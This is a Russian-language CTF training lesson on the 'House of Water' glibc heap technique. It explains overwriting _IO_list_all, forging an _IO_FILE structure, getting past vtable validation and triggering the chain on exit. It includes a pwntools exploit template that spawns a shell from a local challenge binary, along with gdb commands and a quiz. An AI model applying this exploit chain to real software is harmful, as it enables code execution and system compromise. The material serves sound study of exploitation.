---
id: pwn-house-water
title: "House of Water: _IO_list_all и FSOP-цепочка"
category: pwn
parent: pwn-modern-houses
difficulty: expert
order: 3
tags: [heap, house-of-water, fsop, io-list-all, vtable, glibc]
prerequisites: [pwn-house-corrosion]
useful_for:
  - "CTF Pwn категория"
  - "Modern glibc exploitation"
  - "Vulnerability research"
estimated_minutes: 50
summary: "Разбираем House of Water: манипуляция _IO_list_all и построение FSOP-цепочки до захвата управления в modern glibc."
---

House of Water — техника, которая использует список `_IO_list_all` и механизм FSOP (File-Stream-Oriented Programming). Когда программа завершается (или вызывает `exit`), libc обходит `_IO_list_all` и вызывает для каждого потока `_IO_flush_all_lockp`, что приводит к виртуальным вызовам через vtable. Если вы контролируете `_IO_list_all` или одну из `_IO_FILE`-структур, вы направляете этот вызов в свою цепочку.

В этом уроке — механика `_IO_list_all`, устройство FSOP-цепочки, обход проверки vtable и полный эксплойт. Материал завершает модуль `pwn-modern-houses` и связан с `pwn-fsop` и `pwn-io-file-internals`.

## Что такое House of Water

Идея: получить произвольную запись в `_IO_list_all` (или подделать структуру, на которую он указывает) и заставить libc при выходе вызвать `_IO_OVERFLOW`/`_IO_UNDERFLOW` подконтрольного потока. В отличие от House of Orange (который использует top chunk), Water комбинирует современные примитивы (например, large bin или tcache) для записи в список потоков.

Название — дань «домам» (house-of-*), но техника ближе к FSOP, чем к чистой работе с бинами.

## _IO_list_all и FSOP

`_IO_list_all` — глобальный указатель на список всех открытых потоков `_IO_FILE_plus`. При выходе вызывается `_IO_flush_all_lockp`, которая для каждого потока:

```c
if (((fp->_mode <= 0 && fp->_IO_write_ptr > fp->_IO_write_base)
     || (_IO_vtable_offset(fp) == 0 && fp->_mode > 0 && ...))
    && _IO_OVERFLOW(fp, EOF) == EOF)
```

`_IO_OVERFLOW` — это вызов через vtable: `fp->vtable->__overflow(fp, EOF)`. Если вы подделали `vtable`, вызов уйдёт на ваш гаджет (в modern glibc — `setcontext+0x35` или `system`).

## Механика

Схема:

1. Получить произвольную запись в память (через tcache/large bin/unsorted bin).
2. Перезаписать `_IO_list_all` указателем на подделанную `_IO_FILE` в контролируемой памяти.
3. В подделанной структуре выставить поля так, чтобы условие в `_IO_flush_all_lockp` прошло (`_IO_write_ptr > _IO_write_base`).
4. Подделать vtable, чтобы `__overflow` указывал на нужный гаджет.
5. Вызвать `exit` (или дождаться завершения программы).

Проверка vtable в glibc 2.24+ (`IO_validate_vtable`) требует, чтобы vtable лежал в секции `__libc_IO_vtables`. Обход — использовать валидную таблицу (`_IO_wfile_jumps`) или `setcontext`.

## Инструменты и команды

```bash
# найдём _IO_list_all и _IO_2_1_stdout_
nm -D /lib/x86_64-linux-gnu/libc.so.6 | grep -E "_IO_list_all|_IO_2_1_stdout_|_IO_wfile_jumps"

# смещение setcontext
readelf -s libc.so.6 | grep setcontext

# в отладчике: смотрим список потоков
gdb -q ./chall
(gdb) p _IO_list_all
(gdb) p *(struct _IO_FILE_plus *)_IO_list_all
(gdb) p &_IO_2_1_stdout_
```

`p _IO_list_all` показывает текущий список; `p *(struct _IO_FILE_plus *)...` разворачивает структуру — удобно сверять подделку.

## Разобранный пример

Пусть есть произвольная запись (например, tcache poisoning) и утечка libc. Цель — подделать `_IO_FILE` и перезаписать `_IO_list_all`.

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
libc.address = leak - libc.sym['puts']

fake_file = heap_base + 0x2a0
# подделываем структуру: _flags, _IO_write_base < _IO_write_ptr, vtable
payload  = p64(0)                    # _flags
payload += p64(0)                    # _IO_read_ptr
payload += p64(0)                    # _IO_read_end
payload += p64(0)                    # _IO_read_base
payload += p64(0)                    # _IO_write_base
payload += p64(1)                    # _IO_write_ptr > base -> условие прошло
payload += p64(0) * 8
payload += p64(libc.sym['_IO_wfile_jumps'] + 0x10)  # vtable
edit(0, payload)

# перезаписываем _IO_list_all
arbitrary_write(libc.sym['_IO_list_all'], fake_file)
```

## Полный эксплойт

```python
from pwn import *
context.arch = 'amd64'

io = process('./chall')
def alloc(sz): io.sendline(f'alloc {sz}'.encode())
def edit(i,d): io.sendline(f'edit {i}'.encode()); io.send(d)

# 1. утечка libc и heap (через unsorted bin / tcache)
libc.address = leak_libc()
heap = leak_heap()

# 2. готовим подделанный _IO_FILE
fake = heap + 0x300
frame = SigreturnFrame()
frame.rip = libc.sym['system']
frame.rdi = next(libc.search(b'/bin/sh'))
frame.rsp = heap + 0x800

io_file  = p64(0) + p64(0)*3 + p64(0) + p64(1) + p64(0)*8
io_file += p64(libc.sym['_IO_wfile_jumps'] + 0x10)
io_file += bytes(frame)

edit(0, io_file)                    # кладём структуру в контролируемую память
arb_write(libc.sym['_IO_list_all'], fake)   # указываем список на неё

io.sendline(b'exit')                # триггерим flush -> __overflow -> setcontext
io.interactive()
```

Ожидаемый вывод:

```
[*] libc base: 0x7f...
[*] fake FILE @ 0x555555559300
[+] shell
$ id
uid=1000(user) gid=1000(user)
```

## Связка с vtable

Проверка `IO_validate_vtable` ограничивает vtable секцией `__libc_IO_vtables`. Варианты обхода:

- **`_IO_wfile_jumps`.** Валидная таблица; смещая указатель на нужный слот, получаете вызов `setcontext` или иной гаджет.
- **`_IO_str_jumps`.** В старых glibc даёт `_IO_str_overflow`, вызывающий `malloc`/`free` с контролируемыми аргументами.
- **`setcontext+0x35`.** Если удаётся вызвать напрямую, контекст берётся из `rdx`.

Комбинация FSOP + `setcontext` — стандарт modern glibc.

## Ограничения

- **Проверка vtable.** Требует валидной таблицы.
- **Нужна утечка libc.** Для адресов `_IO_list_all`/vtable.
- **Условие flush.** Нужно корректно выставить `_IO_write_ptr`/`_IO_write_base`.
- **Версия glibc.** Смещения и поведение меняются.

## FSOP в деталях: путь до __overflow

Понимание точного пути помогает отладить цепочку. При вызове `exit()` (или завершении `main`) glibc вызывает `_IO_cleanup`, которая идёт по `_IO_list_all` и для каждого потока вызывает `_IO_flush_all_lockp`. Внутри проверяется условие, и если оно выполнено, вызывается:

```c
_IO_OVERFLOW(fp, EOF);
```

что разворачивается в `fp->vtable->__overflow(fp, EOF)`. Здесь два ключевых момента:

- **`fp`** — указатель на подделанную структуру; его вы контролируете.
- **`vtable->__overflow`** — адрес вызова; если vtable подделан (или указывает на валидную таблицу с нужным слотом), вызов уходит на ваш гаджет.

В modern glibc перед вызовом выполняется `IO_validate_vtable`, поэтому vtable должен указывать в `__libc_IO_vtables`. Отсюда популярность `_IO_wfile_jumps`: это валидная таблица, и сдвиг указателя даёт нужный метод. Если удаётся направить `__overflow` на `setcontext+0x35`, контекст берётся из `rdx`, который при вызове равен `fp` — а `fp` указывает на вашу структуру. Дальше срабатывает SROP-подобная логика.

## Практика: утечка libc и heap перед FSOP

FSOP требует адресов libc (для `_IO_list_all`, vtable, `system`) и heap (для подделанной структуры). Типовые источники:

- **Unsorted bin leak.** Освободите чанк размером > `tcache_max` — в `fd` появится адрес `main_arena`, дающий libc.
- **Tcache leak.** В modern glibc tcache-чанки содержат закодированные указатели; для утечки нужен `fd` с известным смещением.
- **stdout leak.** Через подделку `_IO_2_1_stdout_` можно вывести адрес libc (см. `pwn-io-stdout`).
- **Heap leak.** Через чтение освобождённого чанка или через вывод указателей программой.

Собрав обе утечки, вы вычисляете `libc.address` и `heap_base`, после чего строите `_IO_FILE` в куче и записываете `_IO_list_all`. Без утечек FSOP почти невозможен, поэтому этап leak — обязательная часть плана.

## Пошаговый чек-лист Water

1. **Утечки.** Получите адреса libc (для `_IO_list_all`, vtable, `system`) и heap (для подделанной структуры).
2. **Создайте fake `_IO_FILE`** в контролируемой памяти: `_flags`, `_IO_write_base`/`_IO_write_ptr` (условие flush), `_wide_data`, vtable.
3. **Создайте `_IO_wide_data`** и подделанную wide-vtable (если используете wide-путь).
4. **Направьте `_IO_list_all`** на fake FILE через произвольную запись.
5. **Подготовьте контекст** для `setcontext+0x35` (SigreturnFrame) или напрямую аргумент `system`.
6. **Триггерните `exit`/`fflush`** и дождитесь вызова.
7. **Проверьте shell.**

Ключевые проверки в gdb: `p _IO_list_all` (указывает ли на ваш fake FILE), `p *(struct _IO_FILE_plus *)fake` (корректны ли поля), `b _IO_flush_all_lockp` (доходит ли управление). Если вызов не происходит — почти всегда не выполнено условие `_IO_write_ptr > _IO_write_base` или не снят флаг `_IO_NO_WRITES`.

## Практические заметки по отладке

FSOP-цепочку удобно отлаживать по breakpoint'ам в ключевых точках libc: `_IO_flush_all_lockp`, `_IO_wfile_overflow`, `_IO_WDOALLOCATE` (или на адрес гаджета). На каждом шаге проверяйте, что `fp` указывает на вашу структуру, а поля соответствуют ожиданиям. Если управление «проскакивает» мимо вызова, значит условие flush не выполнено — вернитесь и поправьте `_IO_write_ptr`/`_IO_write_base`.

Помните, что `exit` вызывает не только flush, но и другие обработчики (`__run_exit_handlers`), которые могут упасть раньше. Если программа падает до вашего вызова, поставьте breakpoint в начале `exit` и идите по шагам. Иногда проще триггерить `fflush(stdout)` явно, чем полагаться на завершение программы. Ещё один приём — вызвать `_IO_flush_all_lockp` напрямую через ROP, если у вас уже есть контроль над потоком управления: это убирает зависимость от `exit`.

## Частые ошибки

- **Не выставить условие flush.** Без `write_ptr > write_base` вызов не произойдёт.
- **Неверная vtable.** Проверка `IO_validate_vtable` отклонит подделку.
- **Забыть про `_mode`.** В некоторых путях проверяется `_mode`.
- **Неверный адрес `_IO_list_all`.** Всегда берите из libc.
- **Триггер не сработал.** Убедитесь, что программа реально вызывает `exit`/`fflush`.

## Что дальше / решение

- Изучите `pwn-fsop` и `pwn-io-file-internals` для деталей `_IO_FILE`.
- Свяжите с `pwn-exit-handlers` — путь через `__run_exit_handlers`.
- Смотрите `pwn-io-stdout` для утечек через stdout.
- Практикуйте `p *(struct _IO_FILE_plus *)` в gdb.

## Справочные таблицы

| Символ | Роль |
|---|---|
| _IO_list_all | список потоков |
| _IO_flush_all_lockp | обход при exit |
| _IO_wfile_jumps | валидная vtable |
| setcontext | переключение контекста |

| Поле | Условие |
|---|---|
| _IO_write_ptr | > _IO_write_base |
| _mode | <= 0 или > 0 |
| vtable | в __libc_IO_vtables |

## Квиз

```quiz
- question: "Что обходит libc при завершении программы, используя _IO_list_all?"
  options:
    - "_IO_flush_all_lockp"
    - "malloc"
    - "pthread_create"
    - "mmap"
  answer: 0
  explanation: "При exit libc обходит список потоков и вызывает их __overflow."
- question: "Почему в modern glibc нельзя подсунуть произвольную vtable?"
  options:
    - "Из-за проверки IO_validate_vtable"
    - "Из-за NX"
    - "Из-за ASLR"
    - "Из-за canary"
  answer: 0
  explanation: "Проверка требует, чтобы vtable лежал в __libc_IO_vtables."
- question: "Какое условие нужно для вызова __overflow при flush?"
  options:
    - "_IO_write_ptr > _IO_write_base"
    - "_IO_read_ptr == 0"
    - "size == 0"
    - "flags == 1"
  answer: 0
  explanation: "Именно это условие заставляет libc вызвать __overflow."
```

## Где пригодится

- **CTF:** FSOP-задачи на modern glibc.
- **Bug bounty:** баги в обработке потоков ввода-вывода.
- **Пентест:** обход hardening glibc.
- **Работа:** понимание внутренностей libc I/O.
